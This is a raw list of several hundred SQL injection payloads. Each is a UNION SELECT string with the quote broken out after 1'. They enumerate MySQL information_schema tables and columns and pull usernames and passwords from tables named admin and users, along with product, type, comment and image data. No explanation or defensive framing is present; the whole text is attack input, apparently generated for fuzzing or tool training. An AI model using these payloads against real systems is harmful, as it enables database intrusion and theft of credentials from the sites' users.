1' UNION SELECT name ,type ,price ,NULL FROM products WHERE price <>'
1' UNION SELECT comment ,comment ,name ,NULL FROM commentsnew WHERE comment ='1
1' UNION SELECT name ,NULL ,type ,name FROM products WHERE price <>'
1' UNION SELECT NULL ,description ,NULL ,NULL FROM types WHERE id ='1
1' UNION SELECT NULL ,name ,description ,NULL FROM types WHERE id ='1
1' UNION SELECT NULL ,name ,id ,NULL FROM types WHERE id ='1
1' UNION SELECT images ,NULL ,NULL ,NULL FROM image WHERE images ='1
1' UNION SELECT images ,NULL ,images ,NULL FROM image WHERE images <>'
1' UNION SELECT name ,NULL ,description ,NULL FROM types WHERE name <>'
1' UNION SELECT NULL ,NULL ,NULL ,images FROM image WHERE images <>'
1' UNION SELECT DATA_TYPE ,NULL ,COLUMN_TYPE ,CHARACTER_SET_NAME FROM information_schema.columns WHERE DATA_TYPE <>'
1' UNION SELECT id ,id ,password ,username FROM admin WHERE password ='1
1' UNION SELECT NULL ,id ,description ,name FROM types WHERE name <>'
1' UNION SELECT username ,username ,password ,username FROM admin WHERE id ='1
1' UNION SELECT password ,password ,id ,password FROM users WHERE username <>'
1' UNION SELECT TABLE_NAME ,GENERATION_EXPRESSION ,GENERATION_EXPRESSION ,COLUMN_DEFAULT FROM information_schema.columns WHERE COLUMN_TYPE <>'
1' UNION SELECT password ,password ,username ,id FROM users WHERE username ='1
1' UNION SELECT password ,NULL ,NULL ,username FROM admin WHERE username ='1
1' UNION SELECT password ,username ,id ,password FROM admin WHERE id ='1
1' UNION SELECT id ,password ,password ,NULL FROM admin WHERE id ='1
1' UNION SELECT username ,username ,id ,NULL FROM users WHERE id ='1
1' UNION SELECT price ,name ,NULL ,type FROM products WHERE type <>'
1' UNION SELECT TABLE_SCHEMA ,COLUMN_COMMENT ,SRS_ID ,COLUMN_KEY FROM information_schema.columns WHERE COLUMN_TYPE <>'
1' UNION SELECT id ,username ,id ,password FROM admin WHERE password ='1
1' UNION SELECT username ,NULL ,username ,NULL FROM admin WHERE password ='1
1' UNION SELECT DATETIME_PRECISION ,NULL ,NUMERIC_PRECISION ,PRIVILEGES FROM information_schema.columns WHERE SRS_ID ='1
1' UNION SELECT name ,id ,NULL ,description FROM types WHERE id ='1
1' UNION SELECT AVG_ROW_LENGTH ,TABLE_COMMENT ,VERSION ,CREATE_OPTIONS FROM information_schema.tables WHERE CREATE_OPTIONS <>'
1' UNION SELECT password ,id ,id ,password FROM users WHERE username ='1
1' UNION SELECT password ,id ,NULL ,username FROM users WHERE username <>'
1' UNION SELECT ORDINAL_POSITION ,TABLE_SCHEMA ,COLUMN_COMMENT ,PRIVILEGES FROM information_schema.columns WHERE COLLATION_NAME ='1
1' UNION SELECT type ,id ,id ,price FROM products WHERE type <>'
1' UNION SELECT description ,name ,NULL ,name FROM types WHERE description <>'
1' UNION SELECT name ,NULL ,price ,price FROM products WHERE type <>'
1' UNION SELECT password ,NULL ,id ,id FROM users WHERE username ='1
1' UNION SELECT password ,id ,password ,password FROM users WHERE password ='1
1' UNION SELECT username ,id ,password ,username FROM users WHERE id ='1
1' UNION SELECT username ,username ,password ,id FROM users WHERE password <>'
1' UNION SELECT comment ,comment ,NULL ,name FROM commentsnew WHERE name ='1
1' UNION SELECT name ,NULL ,NULL ,name FROM commentsnew WHERE name ='1
1' UNION SELECT NULL ,type ,NULL ,NULL FROM products WHERE type <>'
1' UNION SELECT name ,name ,NULL ,id FROM types WHERE description <>'
1' UNION SELECT TABLE_SCHEMA ,COLLATION_NAME ,COLLATION_NAME ,SRS_ID FROM information_schema.columns WHERE PRIVILEGES ='1
1' UNION SELECT id ,NULL ,username ,password FROM users WHERE username ='1
1' UNION SELECT COLUMN_NAME ,ORDINAL_POSITION ,NUMERIC_PRECISION ,COLUMN_COMMENT FROM information_schema.columns WHERE IS_NULLABLE <>'
1' UNION SELECT password ,username ,username ,id FROM users WHERE username ='1
1' UNION SELECT CHECK_TIME ,TABLE_NAME ,VERSION ,TABLE_COLLATION FROM information_schema.tables WHERE DATA_FREE ='1
1' UNION SELECT NULL ,comment ,comment ,NULL FROM commentsnew WHERE comment <>'
1' UNION SELECT username ,username ,id ,username FROM users WHERE id ='1
1' UNION SELECT CHARACTER_SET_NAME ,TABLE_SCHEMA ,IS_NULLABLE ,NUMERIC_SCALE FROM information_schema.columns WHERE TABLE_NAME ='1
1' UNION SELECT type ,NULL ,type ,type FROM products WHERE price <>'
1' UNION SELECT CHARACTER_OCTET_LENGTH ,CHARACTER_OCTET_LENGTH ,COLUMN_DEFAULT ,DATA_TYPE FROM information_schema.columns WHERE ORDINAL_POSITION <>'
1' UNION SELECT id ,NULL ,id ,id FROM users WHERE username <>'
1' UNION SELECT CHECK_TIME ,TABLE_NAME ,CREATE_OPTIONS ,TABLE_COLLATION FROM information_schema.tables WHERE AUTO_INCREMENT ='1
1' UNION SELECT NULL ,description ,name ,id FROM types WHERE id <>'
1' UNION SELECT NULL ,name ,price ,name FROM products WHERE id <>'
1' UNION SELECT NULL ,NULL ,NULL ,images FROM image WHERE images ='1
1' UNION SELECT id ,NULL ,id ,id FROM users WHERE username ='1
1' UNION SELECT NULL ,NULL ,images ,images FROM image WHERE images ='1
1' UNION SELECT name ,name ,description ,name FROM types WHERE id <>'
1' UNION SELECT TABLE_SCHEMA ,NULL ,TABLE_CATALOG ,DATA_FREE FROM information_schema.tables WHERE TABLE_SCHEMA ='1
1' UNION SELECT id ,password ,NULL ,password FROM admin WHERE username ='1
1' UNION SELECT name ,price ,id ,name FROM products WHERE id ='1
1' UNION SELECT name ,name ,name ,NULL FROM products WHERE name <>'
1' UNION SELECT name ,NULL ,type ,NULL FROM products WHERE id <>'
1' UNION SELECT id ,name ,description ,NULL FROM types WHERE name <>'
1' UNION SELECT NUMERIC_SCALE ,COLLATION_NAME ,NUMERIC_SCALE ,DATA_TYPE FROM information_schema.columns WHERE SRS_ID ='1
1' UNION SELECT NUMERIC_PRECISION ,TABLE_NAME ,COLUMN_DEFAULT ,COLUMN_TYPE FROM information_schema.columns WHERE TABLE_NAME ='1
1' UNION SELECT images ,NULL ,images ,NULL FROM image WHERE images <>'
1' UNION SELECT name ,comment ,NULL ,comment FROM commentsnew WHERE comment <>'
1' UNION SELECT password ,id ,id ,password FROM users WHERE username ='1
1' UNION SELECT comment ,comment ,name ,comment FROM commentsnew WHERE comment ='1
1' UNION SELECT NULL ,type ,price ,type FROM products WHERE name <>'
1' UNION SELECT NUMERIC_PRECISION ,GENERATION_EXPRESSION ,DATA_TYPE ,TABLE_CATALOG FROM information_schema.columns WHERE IS_NULLABLE <>'
1' UNION SELECT NULL ,NULL ,password ,id FROM users WHERE password ='1
1' UNION SELECT id ,NULL ,username ,password FROM users WHERE id ='1
1' UNION SELECT NULL ,CREATE_TIME ,TABLE_ROWS ,CREATE_OPTIONS FROM information_schema.tables WHERE CHECK_TIME ='1
1' UNION SELECT CREATE_OPTIONS ,CREATE_TIME ,TABLE_CATALOG ,CREATE_TIME FROM information_schema.tables WHERE TABLE_TYPE ='1
1' UNION SELECT description ,id ,name ,description FROM types WHERE description <>'
1' UNION SELECT NULL ,NULL ,NULL ,images FROM image WHERE images <>'
1' UNION SELECT COLUMN_KEY ,ORDINAL_POSITION ,DATETIME_PRECISION ,COLUMN_COMMENT FROM information_schema.columns WHERE NUMERIC_PRECISION <>'
1' UNION SELECT price ,price ,type ,type FROM products WHERE price ='1
1' UNION SELECT images ,images ,images ,images FROM image WHERE images ='1
1' UNION SELECT NULL ,id ,description ,NULL FROM types WHERE id <>'
1' UNION SELECT password ,password ,NULL ,id FROM admin WHERE id <>'
1' UNION SELECT id ,description ,description ,name FROM types WHERE id ='1
1' UNION SELECT id ,NULL ,id ,username FROM users WHERE username ='1
1' UNION SELECT description ,name ,id ,name FROM types WHERE name ='1
1' UNION SELECT NULL ,NULL ,NULL ,NULL FROM image WHERE images ='1
1' UNION SELECT description ,id ,name ,description FROM types WHERE name <>'
1' UNION SELECT NULL ,MAX_DATA_LENGTH ,DATA_LENGTH ,ENGINE FROM information_schema.tables WHERE TABLE_SCHEMA ='1
1' UNION SELECT NULL ,id ,password ,NULL FROM users WHERE password <>'
1' UNION SELECT CREATE_OPTIONS ,TABLE_CATALOG ,NULL ,CREATE_OPTIONS FROM information_schema.tables WHERE TABLE_SCHEMA ='1
1' UNION SELECT NULL ,NULL ,NULL ,NULL FROM image WHERE images <>'
1' UNION SELECT images ,NULL ,images ,images FROM image WHERE images ='1
1' UNION SELECT name ,name ,name ,NULL FROM commentsnew WHERE comment <>'
1' UNION SELECT NULL ,password ,password ,id FROM admin WHERE id <>'
1' UNION SELECT type ,NULL ,name ,price FROM products WHERE price ='1
1' UNION SELECT username ,password ,id ,username FROM users WHERE username <>'
1' UNION SELECT id ,NULL ,id ,id FROM users WHERE password ='1
1' UNION SELECT price ,name ,type ,price FROM products WHERE id ='1
1' UNION SELECT NULL ,NULL ,images ,NULL FROM image WHERE images <>'
1' UNION SELECT type ,NULL ,NULL ,price FROM products WHERE type <>'
1' UNION SELECT CREATE_TIME ,TABLE_COMMENT ,NULL ,DATA_LENGTH FROM information_schema.tables WHERE VERSION <>'
1' UNION SELECT NULL ,NULL ,images ,NULL FROM image WHERE images ='1
1' UNION SELECT username ,password ,password ,NULL FROM users WHERE password <>'
1' UNION SELECT images ,NULL ,NULL ,NULL FROM image WHERE images ='1
1' UNION SELECT NULL ,NULL ,password ,id FROM admin WHERE password ='1
1' UNION SELECT EXTRA ,PRIVILEGES ,COLUMN_NAME ,IS_NULLABLE FROM information_schema.columns WHERE GENERATION_EXPRESSION <>'
1' UNION SELECT TABLE_TYPE ,AUTO_INCREMENT ,DATA_LENGTH ,TABLE_NAME FROM information_schema.tables WHERE TABLE_CATALOG ='1
1' UNION SELECT images ,images ,NULL ,NULL FROM image WHERE images ='1
1' UNION SELECT NULL ,CHECKSUM ,CHECKSUM ,CHECKSUM FROM information_schema.tables WHERE AUTO_INCREMENT <>'
1' UNION SELECT NULL ,images ,images ,images FROM image WHERE images ='1
1' UNION SELECT TABLE_COMMENT ,UPDATE_TIME ,VERSION ,TABLE_SCHEMA FROM information_schema.tables WHERE MAX_DATA_LENGTH ='1
1' UNION SELECT password ,id ,id ,password FROM admin WHERE id ='1
1' UNION SELECT price ,NULL ,name ,NULL FROM products WHERE name ='1
1' UNION SELECT DATETIME_PRECISION ,COLUMN_TYPE ,EXTRA ,SRS_ID FROM information_schema.columns WHERE SRS_ID ='1
1' UNION SELECT images ,images ,images ,images FROM image WHERE images <>'
1' UNION SELECT NULL ,username ,id ,id FROM admin WHERE id <>'
1' UNION SELECT CREATE_OPTIONS ,CHECK_TIME ,TABLE_TYPE ,TABLE_NAME FROM information_schema.tables WHERE ROW_FORMAT <>'
1' UNION SELECT NULL ,id ,id ,description FROM types WHERE name ='1
1' UNION SELECT NULL ,comment ,comment ,NULL FROM commentsnew WHERE comment <>'
1' UNION SELECT price ,name ,type ,name FROM products WHERE price ='1
1' UNION SELECT id ,password ,id ,id FROM admin WHERE id ='1
1' UNION SELECT images ,images ,NULL ,images FROM image WHERE images ='1
1' UNION SELECT price ,price ,name ,id FROM products WHERE name ='1
1' UNION SELECT NULL ,IS_NULLABLE ,TABLE_CATALOG ,ORDINAL_POSITION FROM information_schema.columns WHERE TABLE_SCHEMA ='1
1' UNION SELECT id ,username ,NULL ,password FROM admin WHERE username <>'
1' UNION SELECT name ,name ,name ,comment FROM commentsnew WHERE name <>'
1' UNION SELECT name ,price ,type ,price FROM products WHERE name <>'
1' UNION SELECT NULL ,NULL ,NULL ,password FROM users WHERE password ='1
1' UNION SELECT NULL ,id ,NULL ,id FROM products WHERE price ='1
1' UNION SELECT password ,username ,password ,id FROM users WHERE username ='1
1' UNION SELECT NULL ,name ,name ,name FROM commentsnew WHERE name <>'
1' UNION SELECT NULL ,id ,id ,NULL FROM types WHERE description <>'
1' UNION SELECT name ,NULL ,NULL ,NULL FROM commentsnew WHERE name ='1
1' UNION SELECT NULL ,description ,name ,NULL FROM types WHERE id <>'
1' UNION SELECT TABLE_COMMENT ,UPDATE_TIME ,CHECK_TIME ,DATA_LENGTH FROM information_schema.tables WHERE DATA_LENGTH ='1
1' UNION SELECT name ,type ,name ,type FROM products WHERE name <>'
1' UNION SELECT id ,password ,username ,id FROM admin WHERE id <>'
1' UNION SELECT password ,id ,NULL ,id FROM users WHERE id <>'
1' UNION SELECT NULL ,images ,NULL ,images FROM image WHERE images <>'
1' UNION SELECT NULL ,name ,NULL ,name FROM types WHERE name <>'
1' UNION SELECT id ,password ,NULL ,password FROM users WHERE username <>'
1' UNION SELECT TABLE_NAME ,DATA_LENGTH ,UPDATE_TIME ,TABLE_TYPE FROM information_schema.tables WHERE CREATE_TIME <>'
1' UNION SELECT COLLATION_NAME ,ORDINAL_POSITION ,TABLE_SCHEMA ,EXTRA FROM information_schema.columns WHERE CHARACTER_OCTET_LENGTH ='1
1' UNION SELECT username ,password ,password ,username FROM admin WHERE username <>'
1' UNION SELECT images ,NULL ,images ,images FROM image WHERE images <>'
1' UNION SELECT TABLE_SCHEMA ,COLUMN_NAME ,COLUMN_TYPE ,CHARACTER_OCTET_LENGTH FROM information_schema.columns WHERE DATA_TYPE <>'
1' UNION SELECT description ,name ,description ,name FROM types WHERE id <>'
1' UNION SELECT name ,description ,description ,id FROM types WHERE description ='1
1' UNION SELECT INDEX_LENGTH ,TABLE_CATALOG ,ROW_FORMAT ,TABLE_NAME FROM information_schema.tables WHERE TABLE_TYPE <>'
1' UNION SELECT id ,description ,name ,description FROM types WHERE description <>'
1' UNION SELECT DATA_TYPE ,NUMERIC_SCALE ,NULL ,NUMERIC_PRECISION FROM information_schema.columns WHERE ORDINAL_POSITION <>'
1' UNION SELECT price ,price ,id ,NULL FROM products WHERE name ='1
1' UNION SELECT NULL ,images ,images ,images FROM image WHERE images <>'
1' UNION SELECT comment ,comment ,comment ,comment FROM commentsnew WHERE name ='1
1' UNION SELECT NULL ,images ,NULL ,NULL FROM image WHERE images ='1
1' UNION SELECT NULL ,username ,username ,password FROM admin WHERE username <>'
1' UNION SELECT name ,name ,NULL ,name FROM types WHERE id ='1
1' UNION SELECT NULL ,price ,name ,type FROM products WHERE id <>'
1' UNION SELECT NULL ,NULL ,NULL ,NULL FROM image WHERE images <>'
1' UNION SELECT username ,id ,username ,id FROM admin WHERE id ='1
1' UNION SELECT password ,password ,username ,NULL FROM admin WHERE username ='1
1' UNION SELECT id ,NULL ,name ,NULL FROM types WHERE id <>'
1' UNION SELECT COLUMN_NAME ,TABLE_SCHEMA ,COLUMN_DEFAULT ,GENERATION_EXPRESSION FROM information_schema.columns WHERE TABLE_SCHEMA <>'
1' UNION SELECT id ,name ,name ,id FROM products WHERE id <>'
1' UNION SELECT name ,comment ,NULL ,name FROM commentsnew WHERE comment ='1
1' UNION SELECT NULL ,comment ,name ,name FROM commentsnew WHERE name <>'
1' UNION SELECT NULL ,description ,id ,description FROM types WHERE description <>'
1' UNION SELECT type ,type ,NULL ,NULL FROM products WHERE id <>'
1' UNION SELECT NULL ,type ,type ,NULL FROM products WHERE name ='1
1' UNION SELECT description ,name ,description ,description FROM types WHERE id <>'
1' UNION SELECT NULL ,CHECKSUM ,UPDATE_TIME ,TABLE_NAME FROM information_schema.tables WHERE UPDATE_TIME <>'
1' UNION SELECT id ,username ,NULL ,id FROM users WHERE username <>'
1' UNION SELECT COLUMN_KEY ,PRIVILEGES ,CHARACTER_OCTET_LENGTH ,COLUMN_TYPE FROM information_schema.columns WHERE CHARACTER_OCTET_LENGTH <>'
1' UNION SELECT NULL ,name ,id ,name FROM products WHERE id <>'
1' UNION SELECT name ,NULL ,comment ,NULL FROM commentsnew WHERE name <>'
1' UNION SELECT id ,id ,password ,id FROM users WHERE username ='1
1' UNION SELECT images ,NULL ,NULL ,images FROM image WHERE images <>'
1' UNION SELECT username ,id ,username ,id FROM admin WHERE id ='1
1' UNION SELECT NULL ,PRIVILEGES ,COLUMN_NAME ,CHARACTER_SET_NAME FROM information_schema.columns WHERE ORDINAL_POSITION ='1
1' UNION SELECT COLUMN_TYPE ,COLUMN_KEY ,SRS_ID ,COLLATION_NAME FROM information_schema.columns WHERE PRIVILEGES ='1
1' UNION SELECT name ,id ,name ,name FROM types WHERE name ='1
1' UNION SELECT VERSION ,MAX_DATA_LENGTH ,DATA_LENGTH ,DATA_FREE FROM information_schema.tables WHERE VERSION <>'
1' UNION SELECT TABLE_ROWS ,TABLE_ROWS ,DATA_LENGTH ,TABLE_SCHEMA FROM information_schema.tables WHERE AVG_ROW_LENGTH <>'
1' UNION SELECT password ,id ,username ,password FROM admin WHERE username ='1
1' UNION SELECT name ,name ,description ,id FROM types WHERE description <>'
1' UNION SELECT NULL ,TABLE_COMMENT ,AVG_ROW_LENGTH ,TABLE_COMMENT FROM information_schema.tables WHERE ENGINE <>'
1' UNION SELECT password ,password ,NULL ,id FROM admin WHERE username ='1
1' UNION SELECT password ,username ,id ,NULL FROM admin WHERE id ='1
1' UNION SELECT id ,NULL ,price ,price FROM products WHERE id ='1
1' UNION SELECT NULL ,comment ,name ,name FROM commentsnew WHERE name ='1
1' UNION SELECT name ,NULL ,id ,name FROM types WHERE description <>'
1' UNION SELECT id ,name ,type ,name FROM products WHERE name ='1
1' UNION SELECT NULL ,id ,id ,description FROM types WHERE description <>'
1' UNION SELECT DATA_LENGTH ,NULL ,CHECK_TIME ,TABLE_COLLATION FROM information_schema.tables WHERE AVG_ROW_LENGTH ='1
1' UNION SELECT description ,NULL ,name ,NULL FROM types WHERE id <>'
1' UNION SELECT username ,NULL ,username ,id FROM users WHERE id ='1
1' UNION SELECT NULL ,password ,password ,id FROM admin WHERE password <>'
1' UNION SELECT TABLE_TYPE ,CREATE_OPTIONS ,DATA_LENGTH ,TABLE_COMMENT FROM information_schema.tables WHERE INDEX_LENGTH <>'
1' UNION SELECT images ,images ,images ,NULL FROM image WHERE images <>'
1' UNION SELECT id ,id ,password ,NULL FROM users WHERE password <>'
1' UNION SELECT description ,id ,description ,description FROM types WHERE id ='1
1' UNION SELECT NULL ,UPDATE_TIME ,TABLE_COMMENT ,AVG_ROW_LENGTH FROM information_schema.tables WHERE CHECKSUM <>'
1' UNION SELECT name ,NULL ,name ,NULL FROM commentsnew WHERE name <>'
1' UNION SELECT NULL ,username ,username ,username FROM admin WHERE password <>'
1' UNION SELECT NULL ,type ,type ,NULL FROM products WHERE price <>'
1' UNION SELECT PRIVILEGES ,ORDINAL_POSITION ,CHARACTER_OCTET_LENGTH ,CHARACTER_SET_NAME FROM information_schema.columns WHERE IS_NULLABLE ='1
1' UNION SELECT id ,password ,username ,id FROM admin WHERE password <>'
1' UNION SELECT password ,NULL ,NULL ,id FROM users WHERE username <>'
1' UNION SELECT NULL ,NULL ,name ,id FROM products WHERE price <>'
1' UNION SELECT type ,name ,name ,price FROM products WHERE id <>'
1' UNION SELECT password ,username ,username ,password FROM users WHERE username ='1
1' UNION SELECT description ,id ,id ,NULL FROM types WHERE description ='1
1' UNION SELECT TABLE_COLLATION ,AUTO_INCREMENT ,TABLE_ROWS ,CREATE_OPTIONS FROM information_schema.tables WHERE CHECK_TIME <>'
1' UNION SELECT TABLE_CATALOG ,CHARACTER_MAXIMUM_LENGTH ,COLUMN_TYPE ,TABLE_SCHEMA FROM information_schema.columns WHERE SRS_ID <>'
1' UNION SELECT images ,images ,NULL ,images FROM image WHERE images ='1
1' UNION SELECT name ,name ,name ,name FROM commentsnew WHERE comment <>'
1' UNION SELECT ENGINE ,AVG_ROW_LENGTH ,TABLE_CATALOG ,DATA_FREE FROM information_schema.tables WHERE TABLE_COMMENT <>'
1' UNION SELECT name ,NULL ,NULL ,comment FROM commentsnew WHERE comment <>'
1' UNION SELECT id ,id ,name ,type FROM products WHERE price <>'
1' UNION SELECT id ,password ,id ,password FROM users WHERE password ='1
1' UNION SELECT description ,id ,NULL ,name FROM types WHERE name ='1
1' UNION SELECT id ,price ,price ,type FROM products WHERE type ='1
1' UNION SELECT NULL ,type ,NULL ,id FROM products WHERE price <>'
1' UNION SELECT password ,password ,id ,username FROM users WHERE password ='1
1' UNION SELECT id ,NULL ,id ,description FROM types WHERE name ='1
1' UNION SELECT comment ,comment ,comment ,name FROM commentsnew WHERE name ='1
1' UNION SELECT images ,images ,images ,images FROM image WHERE images ='1
1' UNION SELECT NULL ,images ,NULL ,images FROM image WHERE images ='1
1' UNION SELECT password ,password ,password ,password FROM admin WHERE id ='1
1' UNION SELECT NULL ,images ,images ,images FROM image WHERE images ='1
1' UNION SELECT ROW_FORMAT ,DATA_FREE ,TABLE_ROWS ,TABLE_CATALOG FROM information_schema.tables WHERE DATA_FREE ='1
1' UNION SELECT id ,name ,name ,id FROM types WHERE id ='1
1' UNION SELECT NULL ,NULL ,id ,username FROM admin WHERE password <>'
1' UNION SELECT id ,type ,type ,NULL FROM products WHERE name ='1
1' UNION SELECT price ,name ,NULL ,name FROM products WHERE id <>'
1' UNION SELECT comment ,NULL ,NULL ,name FROM commentsnew WHERE comment <>'
1' UNION SELECT id ,description ,name ,NULL FROM types WHERE name <>'
1' UNION SELECT NULL ,images ,images ,images FROM image WHERE images ='1
1' UNION SELECT CHECK_TIME ,CHECK_TIME ,AUTO_INCREMENT ,NULL FROM information_schema.tables WHERE TABLE_COMMENT ='1
1' UNION SELECT images ,images ,images ,images FROM image WHERE images <>'
1' UNION SELECT NULL ,id ,id ,NULL FROM admin WHERE id <>'
1' UNION SELECT username ,id ,id ,password FROM admin WHERE username <>'
1' UNION SELECT UPDATE_TIME ,CREATE_TIME ,MAX_DATA_LENGTH ,UPDATE_TIME FROM information_schema.tables WHERE AVG_ROW_LENGTH <>'
1' UNION SELECT id ,username ,id ,password FROM users WHERE username ='1
1' UNION SELECT name ,NULL ,comment ,name FROM commentsnew WHERE comment ='1
1' UNION SELECT id ,name ,id ,id FROM products WHERE id ='1
1' UNION SELECT password ,id ,id ,NULL FROM admin WHERE password ='1
1' UNION SELECT password ,NULL ,id ,NULL FROM users WHERE id ='1
1' UNION SELECT TABLE_NAME ,TABLE_COMMENT ,TABLE_CATALOG ,MAX_DATA_LENGTH FROM information_schema.tables WHERE UPDATE_TIME ='1
1' UNION SELECT images ,NULL ,images ,NULL FROM image WHERE images ='1
1' UNION SELECT DATA_TYPE ,TABLE_NAME ,EXTRA ,GENERATION_EXPRESSION FROM information_schema.columns WHERE COLUMN_DEFAULT <>'
1' UNION SELECT TABLE_ROWS ,INDEX_LENGTH ,UPDATE_TIME ,AVG_ROW_LENGTH FROM information_schema.tables WHERE DATA_FREE ='1
1' UNION SELECT name ,NULL ,name ,NULL FROM types WHERE name <>'
1' UNION SELECT SRS_ID ,NULL ,COLUMN_DEFAULT ,TABLE_NAME FROM information_schema.columns WHERE COLUMN_DEFAULT <>'
1' UNION SELECT type ,NULL ,name ,NULL FROM products WHERE type ='1
1' UNION SELECT NULL ,password ,NULL ,id FROM admin WHERE id <>'
1' UNION SELECT TABLE_SCHEMA ,CHECK_TIME ,UPDATE_TIME ,ENGINE FROM information_schema.tables WHERE TABLE_ROWS ='1
1' UNION SELECT username ,NULL ,username ,password FROM users WHERE username <>'
1' UNION SELECT DATA_TYPE ,CHARACTER_SET_NAME ,CHARACTER_OCTET_LENGTH ,COLUMN_NAME FROM information_schema.columns WHERE TABLE_SCHEMA ='1
1' UNION SELECT TABLE_COLLATION ,TABLE_ROWS ,DATA_LENGTH ,DATA_LENGTH FROM information_schema.tables WHERE AVG_ROW_LENGTH ='1
1' UNION SELECT NULL ,NULL ,id ,NULL FROM admin WHERE username <>'
1' UNION SELECT NULL ,NULL ,images ,NULL FROM image WHERE images ='1
1' UNION SELECT UPDATE_TIME ,CREATE_TIME ,NULL ,DATA_LENGTH FROM information_schema.tables WHERE CHECK_TIME <>'
1' UNION SELECT TABLE_NAME ,NULL ,TABLE_TYPE ,TABLE_SCHEMA FROM information_schema.tables WHERE TABLE_NAME <>'
1' UNION SELECT name ,id ,NULL ,type FROM products WHERE id ='1
1' UNION SELECT NULL ,images ,NULL ,NULL FROM image WHERE images <>'
1' UNION SELECT description ,id ,id ,NULL FROM types WHERE name ='1
1' UNION SELECT images ,NULL ,NULL ,NULL FROM image WHERE images <>'
1' UNION SELECT NULL ,NULL ,id ,id FROM users WHERE password ='1
1' UNION SELECT SRS_ID ,CHARACTER_SET_NAME ,TABLE_NAME ,DATA_TYPE FROM information_schema.columns WHERE COLUMN_TYPE ='1
1' UNION SELECT id ,NULL ,NULL ,username FROM users WHERE username <>'
1' UNION SELECT TABLE_COLLATION ,DATA_FREE ,INDEX_LENGTH ,DATA_LENGTH FROM information_schema.tables WHERE MAX_DATA_LENGTH ='1
1' UNION SELECT NULL ,id ,username ,username FROM users WHERE password <>'
1' UNION SELECT COLUMN_COMMENT ,COLUMN_NAME ,ORDINAL_POSITION ,CHARACTER_MAXIMUM_LENGTH FROM information_schema.columns WHERE GENERATION_EXPRESSION <>'
1' UNION SELECT type ,type ,id ,NULL FROM products WHERE type ='1
1' UNION SELECT NULL ,id ,NULL ,NULL FROM types WHERE name <>'
1' UNION SELECT price ,price ,NULL ,type FROM products WHERE price ='1
1' UNION SELECT PRIVILEGES ,COLUMN_DEFAULT ,COLUMN_COMMENT ,CHARACTER_MAXIMUM_LENGTH FROM information_schema.columns WHERE SRS_ID ='1
1' UNION SELECT NULL ,NULL ,NULL ,NULL FROM image WHERE images ='1
1' UNION SELECT description ,NULL ,description ,name FROM types WHERE id <>'
1' UNION SELECT NULL ,name ,id ,name FROM products WHERE id ='1
1' UNION SELECT comment ,comment ,comment ,name FROM commentsnew WHERE comment ='1
1' UNION SELECT name ,description ,NULL ,name FROM types WHERE description ='1
1' UNION SELECT NULL ,images ,NULL ,NULL FROM image WHERE images ='1
1' UNION SELECT COLUMN_DEFAULT ,COLUMN_COMMENT ,SRS_ID ,NUMERIC_PRECISION FROM information_schema.columns WHERE IS_NULLABLE ='1
1' UNION SELECT name ,name ,NULL ,name FROM commentsnew WHERE comment ='1
1' UNION SELECT id ,NULL ,id ,id FROM users WHERE id <>'
1' UNION SELECT id ,id ,username ,username FROM users WHERE username ='1
1' UNION SELECT name ,comment ,NULL ,name FROM commentsnew WHERE name <>'
1' UNION SELECT password ,id ,password ,password FROM admin WHERE password <>'
1' UNION SELECT id ,NULL ,NULL ,NULL FROM types WHERE id <>'
1' UNION SELECT NULL ,name ,NULL ,NULL FROM commentsnew WHERE name ='1
1' UNION SELECT price ,type ,id ,name FROM products WHERE id <>'
1' UNION SELECT TABLE_TYPE ,VERSION ,VERSION ,CREATE_TIME FROM information_schema.tables WHERE CHECKSUM <>'
1' UNION SELECT name ,id ,description ,description FROM types WHERE id ='1
1' UNION SELECT price ,name ,NULL ,id FROM products WHERE name <>'
1' UNION SELECT password ,id ,username ,NULL FROM admin WHERE username ='1
1' UNION SELECT NULL ,name ,NULL ,comment FROM commentsnew WHERE comment <>'
1' UNION SELECT name ,description ,NULL ,name FROM types WHERE name <>'
1' UNION SELECT ROW_FORMAT ,ENGINE ,TABLE_COMMENT ,ENGINE FROM information_schema.tables WHERE ENGINE <>'
1' UNION SELECT NULL ,name ,comment ,NULL FROM commentsnew WHERE comment ='1
1' UNION SELECT TABLE_CATALOG ,NULL ,ORDINAL_POSITION ,TABLE_NAME FROM information_schema.columns WHERE SRS_ID <>'
1' UNION SELECT password ,username ,password ,id FROM admin WHERE username <>'
1' UNION SELECT id ,type ,type ,id FROM products WHERE price <>'
1' UNION SELECT TABLE_SCHEMA ,TABLE_NAME ,COLUMN_KEY ,COLUMN_NAME FROM information_schema.columns WHERE DATETIME_PRECISION ='1
1' UNION SELECT NULL ,name ,NULL ,name FROM commentsnew WHERE comment <>'
